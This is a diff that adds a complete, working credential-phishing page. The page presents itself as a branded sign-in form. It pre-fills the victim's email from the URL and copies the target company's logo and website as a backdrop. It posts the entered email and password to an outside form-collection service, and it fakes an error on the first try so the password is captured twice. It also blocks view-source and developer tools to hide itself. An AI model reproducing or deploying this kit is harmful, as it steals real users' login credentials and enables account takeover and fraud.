@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://l2.io/ip.js?var=userip"></script>
+
+<!-- SECURITY META TAGS -->
+<meta name="robots" content="noindex, nofollow">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="X-Content-Type-Options" content="nosniff">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+<style>
+  body { background-color: #f0f2f5; font-family: "Segoe UI", Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+  #iframe-content { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; z-index: 0; filter: blur(3px) brightness(0.6); }
+  #blocker { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; z-index: 5; }
+  #login-box { position: relative; background: #ffffff; padding: 35px; border-radius: 4px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); width: 100%; max-width: 360px; z-index: 10; display: none; }
+  .header { display: flex; flex-direction: column; margin-bottom: 25px; }
+  .header img { height: 32px; margin-bottom: 15px; align-self: flex-start; border: 0; display: none; }
+  .header h2 { margin: 0; font-size: 20px; color: #1b1b1b; font-weight: 600; }
+  .row { display: flex; flex-direction: column; margin-bottom: 20px; position: relative; }
+  .row label { font-size: 14px; font-weight: 600; color: #333; margin-bottom: 8px; }
+  .row input { padding: 10px 12px; border: 1px solid #8a8a8a; border-radius: 2px; font-size: 15px; outline-color: #0067b8; }
+  #email { background: #f4f4f4; border-color: #ddd; color: #555; cursor: not-allowed; }
+  .pass-container { display: flex; position: relative; align-items: center; }
+  .pass-container input { flex: 1; padding-right: 45px; }
+  .toggle-btn { position: absolute; right: 10px; background: none; border: none; color: #0067b8; font-size: 12px; font-weight: 600; cursor: pointer; }
+  button#submit-btn { padding: 10px 25px; background: #0067b8; color: #ffffff; font-weight: bold; border: none; border-radius: 2px; cursor: pointer; font-size: 15px; align-self: flex-end; min-width: 110px; display: flex; justify-content: center; align-items: center; }
+  .spinner { width: 16px; height: 16px; border: 2px solid #ffffff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; margin-left: 8px; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  #error-message { color: #d92d20; margin-top: 15px; font-size: 13px; font-weight: 500; min-height: 1.2em; }
+  p.copy { margin-top: 40px; font-size: 11px; color: #777; border-top: 1px solid #eee; padding-top: 15px; }
+
+  /* Visitor Info Styles */
+  .visitor-info { text-align: center; padding: 14px 20px 10px; font-size: 13px; color: #000000; border-bottom: 1px solid #f0f0f0; margin-bottom: 15px; }
+  .visitor-info .visitor-row { display: flex; justify-content: center; align-items: center; flex-wrap: wrap; gap: 4px 12px; }
+  .visitor-info .visitor-row span { display: inline-flex; align-items: center; gap: 4px; }
+  .visitor-info .visitor-row i { font-size: 14px; color: #000000; }
+  .visitor-info .email { color: #244db8; font-size: 24px; margin-top: 8px; margin-bottom: 10px; font-weight: 400; word-break: break-all; }
+
+  /* Human Verification Overlay */
+  #human-verify { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; display: flex; justify-content: center; align-items: center; z-index: 99999; flex-direction: column; padding: 20px; }
+  #human-verify .box { background: #1e293b; padding: 40px 30px; border-radius: 16px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+  #human-verify h2 { color: #f1f5f9; font-size: 22px; margin-bottom: 8px; }
+  #human-verify p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
+  #human-verify .spinner { width: 48px; height: 48px; border: 4px solid #334155; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+</style>
+</head>
+<body>
+
+<!-- HUMAN VERIFICATION OVERLAY -->
+<div id="human-verify">
+  <div class="box">
+    <div class="spinner"></div>
+    <h2>🔒 Security Check</h2>
+    <p>Verifying your connection to the secure portal...</p>
+  </div>
+</div>
+
+<iframe id="iframe-content" src=""></iframe>
+<div id="blocker"></div>
+
+<div id="login-box">
+  <div class="header">
+    <img id="logo-img" src="" alt="logo">
+    <h2 id="company-name">Sign In</h2>
+  </div>
+
+  <!-- Visitor Info -->
+  <div class="visitor-info" id="visitorInfo">
+    <div class="visitor-row">
+      <span><i class="fas fa-calendar-alt"></i> <span id="visitDate">Loading...</span></span>
+      <span><i class="fas fa-clock"></i> <span id="visitTime">Loading...</span></span>
+      <span><i class="fas fa-globe" id="browserIcon"></i> <span id="visitBrowser">Loading...</span></span>
+      <span><i class="fab fa-windows" id="osIcon"></i> <span id="visitOS">Loading...</span></span>
+      <span><i class="fas fa-map-marker-alt"></i> <span id="visitLocation">Loading...</span></span>
+    </div>
+    <div class="email" id="emailDisplay">Loading...</div>
+  </div>
+  
+  <form id="loginForm" style="display:flex; flex-direction:column;">
+    <div class="row">
+      <label for="email">Email address</label>
+      <input type="email" id="email" readonly>
+    </div>
+
+    <!-- Honeypot Field -->
+    <input type="text" id="b_name" name="_gotcha" style="display:none !important" tabindex="-1" autocomplete="off">
+
+    <div class="row">
+      <label for="password">Password</label>
+      <div class="pass-container">
+        <input type="password" id="password" placeholder="Enter password" required autofocus>
+        <button type="button" class="toggle-btn" id="togglePassword">Show</button>
+      </div>
+    </div>
+
+    <button type="submit" id="submit-btn">
+      <span id="btn-text">Next</span>
+      <div class="spinner" id="btn-spinner"></div>
+    </button>
+
+    <div id="error-message"></div>
+  </form>
+
+  <p class="copy">
+    © 2026 <span id="copy-name">Company</span>. All rights reserved.
+  </p>
+</div>
+
+<script>
+  // --- CONFIGURATION ---
+  const FORMSPARK_URL = "https://submit-form.com/fW90V13PE"; // Formspark ID added here
+
+  // --- STEALTH & SECURITY FEATURES ---
+  // Disable right-click
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  
+  // Disable F12, Ctrl+U, Ctrl+S, Ctrl+C, Ctrl+A
+  document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'c' || e.key === 'C' || e.key === 'a' || e.key === 'A')) e.preventDefault();
+    if (e.key === 'F12') e.preventDefault();
+  });
+
+  // Frame Busting
+  if (window.top !== window.self) window.top.location = window.self.location;
+
+  // BFCache Prevention
+  window.addEventListener('pageshow', function(e) { if (e.persisted) window.location.reload(); });
+
+
+  // --- UTILITY FUNCTIONS ---
+  // UPDATED: Now automatically scans ALL URL parameters for an email address
+  function getEmailFromURL() {
+    let email = null;
+    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+
+    // Helper to scan URLSearchParams object for anything matching the email regex
+    function scanParams(searchString) {
+      const params = new URLSearchParams(searchString);
+      // 1. Check common keys first to prioritize them
+      const commonKeys = ['email', 'Email', 'e', 'mail', 'login', 'user', 'recipient', 'to'];
+      for (let key of commonKeys) {
+        if (params.has(key)) {
+          let val = params.get(key);
+          if (emailRegex.test(val)) return val;
+        }
+      }
+      // 2. If not found in common keys, scan ALL parameters for a valid email pattern
+      for (let [key, value] of params.entries()) {
+        if (emailRegex.test(value)) return value;
+      }
+      return null;
+    }
+
+    // Check query string (?email=... or ?custom=...)
+    if (window.location.search) {
+      email = scanParams(window.location.search);
+    }
+
+    // Check hash fragment (#email=... or #test@example.com)
+    if (!email && window.location.hash) {
+      let hash = window.location.hash.substring(1);
+      if (hash.includes('email=')) {
+         email = scanParams(hash);
+      } else if (emailRegex.test(hash)) {
+         const match = hash.match(emailRegex);
+         if (match) email = match[0];
+      }
+    }
+
+    return email;
+  }
+
+  function getOSInfo() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Windows')) return { name: 'Windows', icon: 'fa-windows' };
+    if (ua.includes('Mac OS X') || ua.includes('Macintosh')) return { name: 'macOS', icon: 'fa-apple' };
+    if (ua.includes('Linux')) {
+      if (ua.includes('Android')) return { name: 'Android', icon: 'fa-android' };
+      return { name: 'Linux', icon: 'fa-linux' };
+    }
+    if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: 'fa-apple' };
+    return { name: 'Unknown', icon: 'fa-desktop' };
+  }
+
+  function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: 'fa-chrome' };
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: 'fa-safari' };
+    if (ua.includes('Firefox')) return { name: 'Firefox', icon: 'fa-firefox' };
+    if (ua.includes('Edg')) return { name: 'Edge', icon: 'fa-edge' };
+    if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: 'fa-opera' };
+    return { name: 'Unknown', icon: 'fa-globe' };
+  }
+
+  async function getLocation() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      if (data.city && data.country_code) return `${data.city}, ${data.country_code}`;
+    } catch {}
+    try {
+      const res2 = await fetch('https://ipinfo.io/json');
+      const data2 = await res2.json();
+      if (data2.city && data2.country) return `${data2.city}, ${data2.country}`;
+    } catch {}
+    return 'Unknown';
+  }
+
+  // --- PASSWORD TOGGLE ---
+  document.getElementById('togglePassword').addEventListener('click', function() {
+    const pwd = document.getElementById('password');
+    if (pwd.type === 'password') {
+      pwd.type = 'text';
+      this.innerText = 'Hide';
+    } else {
+      pwd.type = 'password';
+      this.innerText = 'Show';
+    }
+  });
+
+  // --- DYNAMIC BRANDING AND BACKGROUND ---
+  async function fetchBranding(domain) {
+    try {
+      const nameParts = domain.split('.');
+      const brandName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
+      document.getElementById('company-name').textContent = `Sign in to ${brandName}`;
+      document.getElementById('copy-name').textContent = brandName;
+      
+      const logoImg = document.getElementById('logo-img');
+      logoImg.src = `https://logo.clearbit.com/${domain}`;
+      logoImg.onerror = function() {
+        this.style.display = 'none';
+      };
+      logoImg.onload = function() {
+        this.style.display = 'block';
+      };
+
+      // Dynamic Background
+      const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
+      const img = new Image();
+      img.onload = function() {
+        document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('${bgUrl}')`;
+        document.body.style.backgroundSize = 'cover';
+        document.body.style.backgroundPosition = 'center';
+      };
+      img.src = bgUrl;
+    } catch (e) {
+      console.log('Branding error:', e);
+    }
+  }
+
+  // --- INITIALIZE PAGE ---
+  async function initPage() {
+    const email = getEmailFromURL() || 'No email specified';
+    const domain = email.includes('@') ? email.split('@')[1] : 'unknown.com';
+    
+    document.getElementById('emailDisplay').textContent = email;
+    document.getElementById('email').value = email;
+    
+    const now = new Date();
+    document.getElementById('visitDate').textContent = now.toDateString();
+    document.getElementById('visitTime').textContent = now.toLocaleTimeString();
+    document.getElementById('visitLocation').textContent = await getLocation();
+    
+    const os = getOSInfo();
+    document.getElementById('osIcon').className = `fab ${os.icon}`;
+    document.getElementById('visitOS').textContent = os.name;
+    
+    const browser = getBrowserInfo();
+    document.getElementById('browserIcon').className = `fab ${browser.icon}`;
+    document.getElementById('visitBrowser').textContent = browser.name;
+    
+    await fetchBranding(domain);
+    
+    document.getElementById('login-box').style.display = 'block';
+  }
+
+  // --- FORM SUBMISSION ---
+  let attemptCount = 0;
+
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    // Honeypot check
+    if (document.getElementById('b_name').value.length > 0) return;
+
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const errorEl = document.getElementById('error-message');
+    const btn = document.getElementById('submit-btn');
+    const btnText = document.getElementById('btn-text');
+    const spinner = document.getElementById('btn-spinner');
+
+    if (!email || !password) {
+      errorEl.textContent = 'Please fill in all fields.';
+      return;
+    }
+
+    attemptCount++;
+    errorEl.textContent = '';
+    
+    // UI Loading state
+    btn.disabled = true;
+    spinner.style.display = 'block';
+    btnText.textContent = 'Verifying...';
+
+    // Submit to Formspark
+    try {
+      await fetch(FORMSPARK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: email,
+          password: password,
+          attempt: attemptCount,
+          os: getOSInfo().name,
+          browser: getBrowserInfo().name,
+          timestamp: new Date().toISOString()
+        })
+      });
+    } catch (err) {
+      console.log('Formspark error:', err);
+    }
+
+    // Handle logic after submission
+    if (attemptCount === 1) {
+      setTimeout(() => {
+        btn.disabled = false;
+        spinner.style.display = 'none';
+        btnText.textContent = 'Next';
+        errorEl.textContent = 'Authentication is required! Please try again.';
+        document.getElementById('password').value = '';
+        document.getElementById('password').focus();
+      }, 600);
+    } else {
+      setTimeout(() => {
+        // Redirect to the actual domain after 2nd attempt
+        const domain = email.includes('@') ? email.split('@')[1] : 'https://www.google.com';
+        window.location.href = `https://${domain}`;
+      }, 1500);
+    }
+  });
+
+  // --- AUTO-VERIFY (HUMAN CHECK) ---
+  setTimeout(function() {
+    document.getElementById('human-verify').style.display = 'none';
+    initPage();
+  }, 3000);
+
+</script>
+</body>
+</html>
